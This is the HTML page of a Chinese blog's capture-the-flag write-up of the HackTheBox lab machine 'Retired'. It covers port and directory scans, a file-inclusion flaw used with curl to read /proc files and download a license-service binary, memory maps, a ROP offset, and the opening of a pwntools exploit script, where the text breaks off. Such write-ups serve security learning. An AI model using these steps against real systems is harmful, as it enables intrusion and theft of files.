<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Retired - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;456 10.10.11.154                                                                                                                端口扫描22和80: 1234567">
<meta property="og:type" content="article">
<meta property="og:title" content="Retired - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2022/06/23/Retired-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;456 10.10.11.154                                                                                                                端口扫描22和80: 1234567">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062301.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062302.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062304.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062305.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062303.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062306.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062307.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062308.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062309.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062310.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062311.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062312.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062313.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062314.jpg">
<meta property="article:published_time" content="2022-06-23T06:49:06.000Z">
<meta property="article:modified_time" content="2022-08-15T04:26:14.592Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062301.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                彼女募集中
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                about
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Retired - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Retired - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-06-23T06:49:06.000Z" itemprop="datePublished" class="page-time">
  2022-06-23
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#目录扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">目录扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#beta-html"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">beta.html</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#upload"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">upload</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LFI"><span class="post-toc-number">4.</span> <span class="post-toc-text">LFI</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#activate-license-php"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">activate_license.php</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#proc-sched-debug"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">&#x2F;proc&#x2F;sched_debug</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#proc-pid-cmdline"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">&#x2F;proc&#x2F;pid&#x2F;cmdline</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#activate-license1337"><span class="post-toc-number">5.</span> <span class="post-toc-text">activate_license1337</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#rop"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">rop</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#maps"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">maps</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-py"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">exp.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#website-backup"><span class="post-toc-number">6.</span> <span class="post-toc-text">website_backup</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#usr-bin-webbackup"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">&#x2F;usr&#x2F;bin&#x2F;webbackup</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#软链接"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">软链接</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dev-id-rsa"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">dev_id_rsa</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">7.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#emuemu"><span class="post-toc-number">8.</span> <span class="post-toc-text">emuemu</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权-amp-root-flag"><span class="post-toc-number">9.</span> <span class="post-toc-text">提权 &amp; root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-sh"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">exp.sh</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shadow"><span class="post-toc-number">9.2.</span> <span class="post-toc-text">shadow</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">10.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Retired-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Retired - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-06-23 14:49:06" datetime="2022-06-23T06:49:06.000Z"  itemprop="datePublished">2022-06-23</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://www.hackthebox.com/home/machines/profile/456" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/456</a></li>
<li>10.10.11.154</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062301.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sC -sV 10.10.11.154</span><br><span class="line">Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-06-23 12:53 CST</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">Nmap scan report for 10.10.11.154</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)</span><br><span class="line">|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)</span><br><span class="line">|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    nginx</span><br><span class="line">| http-title: Agency - Start Bootstrap Theme</span><br><span class="line">|_Requested resource was &#x2F;index.php?page&#x3D;default.html</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 117.14 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问自动跳转首页，page参数加载页面，很可能存在LFI：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062302.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>目录扫描可以发现一个beta.html,存在上传功能：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://10.10.11.154/  -x html,php,txt</span><br><span class="line"></span><br><span class="line">/assets               (Status: 301) [Size: 162] [--&gt; http://10.10.11.154/assets/]</span><br><span class="line">/beta.html            (Status: 200) [Size: 4144]</span><br><span class="line">/css                  (Status: 301) [Size: 162] [--&gt; http://10.10.11.154/css/]</span><br><span class="line">/default.html         (Status: 200) [Size: 11414]</span><br><span class="line">/index.php            (Status: 302) [Size: 0] [--&gt; /index.php?page=default.html]</span><br><span class="line">/index.php            (Status: 302) [Size: 0] [--&gt; /index.php?page=default.html]</span><br><span class="line">/js                   (Status: 301) [Size: 162] [--&gt; http://10.10.11.154/js/]</span><br></pre></td></tr></table></figure>

<h2 id="beta-html"><a href="#beta-html" class="headerlink" title="beta.html"></a>beta.html</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062304.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>尝试上传文件，发现activate_license.php：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062305.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>验证存在，会跳转到首页，所以通过repeater或者直接使用curl：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062303.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="activate-license-php"><a href="#activate-license-php" class="headerlink" title="activate_license.php"></a>activate_license.php</h2><p>LFI读前面的activate_license.php，发现本地1337端口的服务：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062306.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="proc-sched-debug"><a href="#proc-sched-debug" class="headerlink" title="/proc/sched_debug"></a>/proc/sched_debug</h2><p>因为1337端口这是另一个进程，首先通过sched_debug获取进程信息：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062307.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="proc-pid-cmdline"><a href="#proc-pid-cmdline" class="headerlink" title="/proc/pid/cmdline"></a>/proc/pid/cmdline</h2><p>然后根据pid再去获取其他信息,得到文件路径：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062308.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="activate-license1337"><a href="#activate-license1337" class="headerlink" title="activate_license1337"></a>activate_license1337</h1><p>下载下来分析，接下来就是二进制部分了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">curl "http://10.10.11.154/index.php?page=/usr/bin/activate_license" --output activate_license</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> file activate_license</span></span><br><span class="line">activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line">checksec activate_license</span><br><span class="line">[*] activate_license</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>基础rop，各种保护所需要的信息可以通过LFI去读maps获取,最终打到www-data:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offset 520</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062309.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="maps"><a href="#maps" class="headerlink" title="maps"></a>maps</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">559bc36a6000-559bc36a7000 r--p 00000000 08:01 2408                       &#x2F;usr&#x2F;bin&#x2F;activate_license</span><br><span class="line">559bc36a7000-559bc36a8000 r-xp 00001000 08:01 2408                       &#x2F;usr&#x2F;bin&#x2F;activate_license</span><br><span class="line">559bc36a8000-559bc36a9000 r--p 00002000 08:01 2408                       &#x2F;usr&#x2F;bin&#x2F;activate_license</span><br><span class="line">559bc36a9000-559bc36aa000 r--p 00002000 08:01 2408                       &#x2F;usr&#x2F;bin&#x2F;activate_license</span><br><span class="line">559bc36aa000-559bc36ab000 rw-p 00003000 08:01 2408                       &#x2F;usr&#x2F;bin&#x2F;activate_license</span><br><span class="line">559bc3ba7000-559bc3bc8000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7f68d48b9000-7f68d48bb000 rw-p 00000000 00:00 0 </span><br><span class="line">7f68d48bb000-7f68d48bc000 r--p 00000000 08:01 3635                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.31.so</span><br><span class="line">7f68d48bc000-7f68d48be000 r-xp 00001000 08:01 3635                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.31.so</span><br><span class="line">7f68d48be000-7f68d48bf000 r--p 00003000 08:01 3635                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.31.so</span><br><span class="line">7f68d48bf000-7f68d48c0000 r--p 00003000 08:01 3635                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.31.so</span><br><span class="line">7f68d48c0000-7f68d48c1000 rw-p 00004000 08:01 3635                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.31.so</span><br><span class="line">7f68d48c1000-7f68d48c8000 r--p 00000000 08:01 3645                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.31.so</span><br><span class="line">7f68d48c8000-7f68d48d8000 r-xp 00007000 08:01 3645                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.31.so</span><br><span class="line">7f68d48d8000-7f68d48dd000 r--p 00017000 08:01 3645                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.31.so</span><br><span class="line">7f68d48dd000-7f68d48de000 r--p 0001b000 08:01 3645                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.31.so</span><br><span class="line">7f68d48de000-7f68d48df000 rw-p 0001c000 08:01 3645                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.31.so</span><br><span class="line">7f68d48df000-7f68d48e3000 rw-p 00000000 00:00 0 </span><br><span class="line">7f68d48e3000-7f68d48f2000 r--p 00000000 08:01 3636                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libm-2.31.so</span><br><span class="line">7f68d48f2000-7f68d498c000 r-xp 0000f000 08:01 3636                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libm-2.31.so</span><br><span class="line">7f68d498c000-7f68d4a25000 r--p 000a9000 08:01 3636                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libm-2.31.so</span><br><span class="line">7f68d4a25000-7f68d4a26000 r--p 00141000 08:01 3636                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libm-2.31.so</span><br><span class="line">7f68d4a26000-7f68d4a27000 rw-p 00142000 08:01 3636                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libm-2.31.so</span><br><span class="line">7f68d4a27000-7f68d4a4c000 r--p 00000000 08:01 3634                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so</span><br><span class="line">7f68d4a4c000-7f68d4b97000 r-xp 00025000 08:01 3634                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so</span><br><span class="line">7f68d4b97000-7f68d4be1000 r--p 00170000 08:01 3634                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so</span><br><span class="line">7f68d4be1000-7f68d4be2000 ---p 001ba000 08:01 3634                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so</span><br><span class="line">7f68d4be2000-7f68d4be5000 r--p 001ba000 08:01 3634                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so</span><br><span class="line">7f68d4be5000-7f68d4be8000 rw-p 001bd000 08:01 3634                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so</span><br><span class="line">7f68d4be8000-7f68d4bec000 rw-p 00000000 00:00 0 </span><br><span class="line">7f68d4bec000-7f68d4bfc000 r--p 00000000 08:01 5321                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libsqlite3.so.0.8.6</span><br><span class="line">7f68d4bfc000-7f68d4cf4000 r-xp 00010000 08:01 5321                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libsqlite3.so.0.8.6</span><br><span class="line">7f68d4cf4000-7f68d4d28000 r--p 00108000 08:01 5321                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libsqlite3.so.0.8.6</span><br><span class="line">7f68d4d28000-7f68d4d2c000 r--p 0013b000 08:01 5321                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libsqlite3.so.0.8.6</span><br><span class="line">7f68d4d2c000-7f68d4d2f000 rw-p 0013f000 08:01 5321                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libsqlite3.so.0.8.6</span><br><span class="line">7f68d4d2f000-7f68d4d31000 rw-p 00000000 00:00 0 </span><br><span class="line">7f68d4d36000-7f68d4d37000 r--p 00000000 08:01 3630                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.31.so</span><br><span class="line">7f68d4d37000-7f68d4d57000 r-xp 00001000 08:01 3630                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.31.so</span><br><span class="line">7f68d4d57000-7f68d4d5f000 r--p 00021000 08:01 3630                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.31.so</span><br><span class="line">7f68d4d60000-7f68d4d61000 r--p 00029000 08:01 3630                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.31.so</span><br><span class="line">7f68d4d61000-7f68d4d62000 rw-p 0002a000 08:01 3630                       &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.31.so</span><br><span class="line">7f68d4d62000-7f68d4d63000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffdd5ef5000-7ffdd5f16000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffdd5f4b000-7ffdd5f4f000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffdd5f4f000-7ffdd5f51000 r-xp 00000000 00:00 0                          [vdso]</span><br></pre></td></tr></table></figure>

<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(sig, frame)</span>:</span></span><br><span class="line">    print(<span class="string">"\n[\033[1;31m-\033[1;37m] Saliendo\n"</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT, kill)</span><br><span class="line"></span><br><span 